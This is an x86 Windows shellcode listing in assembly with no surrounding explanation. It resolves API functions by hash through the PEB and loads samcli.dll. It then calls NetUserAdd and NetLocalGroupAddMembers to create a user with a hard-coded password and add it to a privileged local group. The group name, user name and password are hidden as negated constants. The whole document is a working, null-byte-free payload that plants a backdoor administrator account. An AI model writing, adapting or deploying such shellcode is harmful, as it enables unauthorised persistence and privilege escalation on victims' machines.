start:
    mov ebp, esp                   ;
    add esp, 0xfffff9f0            ; To avoid null bytes

find_kernel32:
    xor ecx, ecx                   ; ECX = 0
    mov esi,fs:[ecx+30h]           ; ESI = &(PEB) ([FS:0x30])
    mov esi,[esi+0Ch]              ; ESI = PEB->Ldr
    mov esi,[esi+1Ch]              ; ESI = PEB->Ldr.InInitOrder

next_module:
    mov ebx, [esi+8h]              ; EBX = InInitOrder[X].base_address
    mov edi, [esi+20h]             ; EDI = InInitOrder[X].module_name
    mov esi, [esi]                 ; ESI = InInitOrder[X].flink (next)
    cmp [edi+12*2], cx             ; (unicode) modulename[12] == 0x00?
    jne next_module                ; No: try next module.

find_function_shorten:
    jmp find_function_shorten_bnc  ; Short jump

find_function_ret:
    pop esi                        ; POP the return address from the stack
    mov [ebp+0x04], esi            ; Save find_function address for later usage
    jmp resolve_symbols_kernel32   ;

find_function_shorten_bnc:         ;
    call find_function_ret         ; Relative CALL with negative offset

find_function:
    pushad                         ; Save all registers
    mov eax, [ebx+0x3c]            ; Offset to PE Signature
    mov edi, [ebx+eax+0x78]        ; Export Table Directory RVA
    add edi, ebx                   ; Export Table Directory VMA
    mov ecx, [edi+0x18]            ; NumberOfNames
    mov eax, [edi+0x20]            ; AddressOfNames RVA
    add eax, ebx                   ; AddressOfNames VMA
    mov [ebp-4], eax               ; Save AddressOfNames VMA for later use
	

find_function_loop:
    jecxz find_function_finished   ; Jump to the end if ECX is 0
    dec ecx                        ; Decrement our names counter
    mov eax, [ebp-4]               ; Restore AddressOfNames VMA
    mov esi, [eax+ecx*4]           ; Get the RVA of the symbol name
    add esi, ebx                   ; Set ESI to the VMA of the current symbol name
		
compute_hash:
    xor eax, eax                   ;
    cdq                            ; Null EDX
    cld                            ; Clear direction

compute_hash_again:
    lodsb                          ; Load the next byte from esi into al
    test al, al                    ; Check for NULL terminator
    jz compute_hash_finished       ; If the ZF is set, we've hit the NULL term
    ror edx, 0x0d                  ; Rotate edx 13 bits to the right
    add edx, eax                   ; Add the new byte to the accumulator
    jmp compute_hash_again         ; Next iteration

compute_hash_finished:

find_function_compare:
    cmp edx, [esp+0x24]            ; Compare the computed hash with the requested hash
    jnz find_function_loop         ; If it doesn't match go back to find_function_loop
    mov edx, [edi+0x24]            ; AddressOfNameOrdinals RVA
    add edx, ebx                   ; AddressOfNameOrdinals VMA
    mov cx, [edx+2*ecx]            ; Extrapolate the function's ordinal
    mov edx, [edi+0x1c]            ; AddressOfFunctions RVA
    add edx, ebx                   ; AddressOfFunctions VMA
    mov eax, [edx+4*ecx]           ; Get the function RVA
    add eax, ebx                   ; Get the function VMA
    mov [esp+0x1c], eax            ; Overwrite stack version of eax from pushad
		
find_function_finished:
    popad                          ; Restore registers
    ret                            ;

resolve_symbols_kernel32:
    push 0x78b5b983                ; Kernel 32 - TerminateProcess hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x10], eax            ; Save TerminateProcess address for later usage
    push 0xec0e4e8e                ; Kernel 32 - LoadLibraryA hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x14], eax            ; Save LoadLibraryA address for later usage

load_samcli:
    xor eax, eax                   ;
    push eax                       ;
    mov ax, 0x6c6c                 ; # ll
    push eax                       ; 
    push 0x642e696c                ; d.il
    push 0x636d6173                ; cmas
    push esp                       ; Push ESP to have a pointer to the string
    call dword [ebp+0x14]          ; Call LoadLibraryA

resolve_symbols_samcli:
    mov ebx, eax                   ; Move the base address of samcli.dll to EBX
    push 0xcd7cdf5e                ; NetUserAdd hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x1C], eax            ; Save NetUserAdd address for later usage
    push 0xc30c3dd7                ; NetLocalGroupAddMembers hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x20], eax            ; Save NetLocalGroupAddMembers address for later usage

execute_shellcode:
    xor eax, eax                   ; eax = 0
    xor ebx, ebx                   ;
    inc ebx                        ; ebx = 1

    push eax                       ; string delimiter
    mov edx, 0xff8cff8e            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff90ff8c            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff9eff8e            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff8bff8d            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff96ff92            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff96ff93            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff9bffbf            ;
    neg edx                        ;
    push edx                       ;

    mov [ebp+0x24], esp            ; store groupname in [esi]

    push eax                       ; string delimiter
    mov edx, 0xff96ff8a            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff9eff88            ;
    neg edx                        ;
    push edx                       ;

    mov ecx, esp                   ; Pointer to the string
    mov [ebp+0x28], ecx            ; store username in [esi+4]

    push eax                       ; string delimiter
    mov edx, 0xffdeffcb            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xffcbffcd            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xffcdffcf            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff8dff9b            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff92ff93            ;
    neg edx                        ;
    push edx                       ;
    mov edx, 0xff8affad            ;
    neg edx                        ;
    push edx                       ;

    mov edx, esp                   ; store password in edx

    push eax                       ; 0 - sScript_Path
    push ebx                       ; 1 - uiFlags
    push eax                       ; 0 - sComment
    push eax                       ; 0 - sHome_Dir
    push ebx                       ; 1 - uiPriv = USER_PRIV_USER = 1
    push eax                       ; 0 - uiPasswordAge
    push edx                       ; str - sPassword
    push ecx                       ; str - sUsername
    mov ecx, esp                   ;

    push eax                       ; 0 - parm_err
    push esp                       ; pointer to USER_INFO_1 structure ?
    push ecx                       ; USER_INFO_1 - UserInfo		
    push ebx                       ; 1 - level	
    push eax                       ; 0 - servername

    call dword [ebp+0x1C]          ; NetUserAdd - System Call

    mov ecx, [ebp+0x28]            ; Domain = Username
    push ecx                       ;
    mov ecx, esp                   ; Save a pointer to Username

    push ebx                       ; 1 - totalentries 
    push ecx                       ; LOCALGROUP_MEMBERS_INFO_3 - username
    push 3                         ; 3 - level 3 means that we are using the structure LOCALGROUP_MEMBERS_INFO_3
    push dword [ebp+0x24]          ; str - groupname
    push eax                       ; 0 - servername

    call dword [ebp+0x20]          ; NetLocalGroupAddMembers - System Call

    xor eax, eax                   ;
    push eax                       ; return 0

    call dword [ebp+0x10]          ; ExitProcess - System Call
